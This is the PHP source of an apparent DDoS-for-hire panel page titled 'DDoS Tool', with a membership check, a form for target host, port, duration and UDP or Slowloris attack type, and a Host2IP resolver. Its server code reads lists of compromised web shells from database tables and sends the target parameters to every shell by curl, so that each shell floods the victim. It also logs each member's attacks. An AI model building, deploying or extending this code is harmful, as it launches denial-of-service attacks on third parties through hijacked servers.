<?php 
define("_VALID_PHP", true); 
require_once("init.php");
?> 
<?php include("header.php");?> 
 
 
	 <?php if($user->checkMembership('6,7,8,9,10')): ?>
<script src="assets/jquery-1.4.4.min.js" type="text/javascript"></script>
<script type="text/javascript">
function hub()
	{
	if (window.XMLHttpRequest)
	  {
	  xmlhttp=new XMLHttpRequest();
	  }
	else
	  {
	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	  }
	xmlhttp.onreadystatechange=function()
	  {
	  if (xmlhttp.readyState==4 && xmlhttp.status==200)
	    {
	    document.getElementById("sent").innerHTML = "Request has been sent to all shells.";
	    }
	  }
	xmlhttp.open("GET","hub.php?host="+document.getElementById('host').value+"&time="+document.getElementById('time').value+"&port="+document.getElementById('port'));
	xmlhttp.send();
}
</script>
 <script>
for(var i=0;i<15;i++)
setTimeout("foo('"+i+"')",(15-i)*500);
function foo(n){
document.getElementById('btn').value=n;
if(n==0){
document.getElementById('btn').value='DDoS';
document.getElementById('btn').disabled=false;
}
}
</script>
<center><div class="box">
<h1>DDoS Tool</h1>
<p class="info">Here you can use the Stress Test Tool.</p>
<center>
<form>
<table cellspacing="0" cellpadding="0" class="box">

      <tbody>
        <b>Attack Type</b><br> <select noame="dosattack" id="dosattack">
                  <option value="1">UDP</option>
                  <option value="2">Slowloris</option>
                </select><br>
    <b>IP/DNS</b> <br><input type="text" style="text-align: center" size="16" name="host" value=""/><br />
    <b>Seconds</b> <br><input type="text" style="text-align: center" size="5" name="time" value="30"/><br />    
    <b>Port</b><br><input type="text" style="text-align: center" size="5" name="port" value="80"/><br />

    </br><input type="submit" disabled='disabled' class="button" id='btn' value='15'input="input" onclick="hub();" />
      </tbody>

    </p><form>
<center>
  </p>
<form>
</form>
<form action="hub.php" method="post">
		  &nbsp;
		  </p>
                 </form>
<p id="sent"></p>
<script type="text/javascript">
function handleKeyPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		hub();
	}
}
function handleEnterPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		getip();
	}
}
</script>
<?php
set_time_limit(10);
ignore_user_abort(TRUE);

include 'lib/EpiCurl.php';
require("lib/ezSQLCore.php");
require("lib/ezSQL.php");


if (isset($_GET['host']) && isset($_GET['time']) && isset($_GET['port']))
{

	$SQL = new ezSQL_mysql();
	$SQL->connect(DB_USER, DB_PASS);
	$SQL->select(DB_DATABASE);
	$Query = "SELECT * FROM `getshells`";
        $AffectedRows = $SQL->query($Query);
        $host = $_GET['host'];
        $time = intval($_GET['time']);
        $port = intval($_GET['port']);
        $mc = EpiCurl::getInstance();
	$ch = array();


if($time >= 121) {
die("<hr>You cannot issue attacks exceeding 120 seconds.");
}

if($host == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($time == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($port == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

/*
* Example Blacklisting
*/

if($host == "hackforums.net") { die("<hr><font color=lime><center>You cannot attack this.</center></font color>"); }
if($host == "66.220.149.32") { die("<hr><font color=lime><center>You cannot attack this.</center></font color>"); }
if($host == "facebook.com") { die("<hr><font color=lime><center>You cannot attack this.</center></font color>"); }

/*
* End of blacklisting
*/

    for($i = 0; $i < $AffectedRows; $i++)
    {
	$row = $SQL->last_result[$i];
        $shell = trim($row->URL);

        if (strlen($shell) == 0)
            continue;

        $shell .= "?act=phptools&host={$host}&time={$time}&port={$port}";
        $ch[$i] = curl_init($shell);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_TIMEOUT, 7);
        $curl1 = $mc->addCurl($ch[$i]);
    }

	$Query = "SELECT * FROM `postshells`";
	$AffectedRows = $SQL->query($Query);
    $ch2 = array();
    $post = "ip={$host}&time={$time}&port={$port}";

    for($i = 0; $i < $AffectedRows; $i++)
    {
		$row = $SQL->last_result[$i];
        $shell = trim($row->URL);
        if (strlen($shell) == 0)
            continue;
        $header = array();
		$header[] = "Cache-Control: max-age=0";
		$header[] = "Connection: keep-alive";
		$header[] = "Keep-Alive: 300";
		$header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
		$header[] = "Accept-Language: en-us,en;q=0.5";
		$header[] = "Pragma: ";
        $ch2[$i] = curl_init($shell);
		curl_setopt($ch2[$i], CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch2[$i], CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2[$i], CURLOPT_FORBID_REUSE, 1);
        curl_setopt($ch2[$i], CURLOPT_POST, 1);
        curl_setopt($ch2[$i], CURLOPT_POSTFIELDS, $post);
        $curl1 = $mc->addCurl($ch2[$i]);
    }

echo "<p id='sent'><center><strong><font color=\"lime\">Attack has been sent!</font></strong></center></p>";

$username = $_SESSION['username'];
$host = strip_tags(mysql_real_escape_string($_GET['host']));
$time = strip_tags(mysql_real_escape_string($_GET['time']));
$port = strip_tags(mysql_real_escape_string($_GET['port']));
$date = date("m-d-Y, h:i:s a", time());

mysql_query("INSERT INTO logs
(username, ip, time, port, date) VALUES('" . $username . "', '" .$host . "', '" . $time . "', '" . $port . "', '" . $date . "' ) ")
or die(mysql_error());

mysql_query("UPDATE users set myAttacks = myAttacks + 1 WHERE username = '" . $username . "'") or die(mysql_error());

}
?>
</center>
</center>
 
<div class="box">
<h1>Host2IP</h1>
<p class="info">Here you can Resolve your Hostname to IP's.</p>
    <?php
    if(isset($_POST['submit']))
    {
    echo gethostbyname($_POST['link']);
    }
    else
    {
    echo "<form method='post'><input type='text' id='link' name='link' value='www.google.com'><br /><br /><input type='submit' id='submit' class='button' name='submit' value='Get IP'></form>";
    }
    ?>

	 <?php else: ?>
 
	 <h1>User membership is not valid. You do not have Access</h1>
 
	 <?php endif; ?>
 
 
 <?php include("footer.php");?> 
 
 
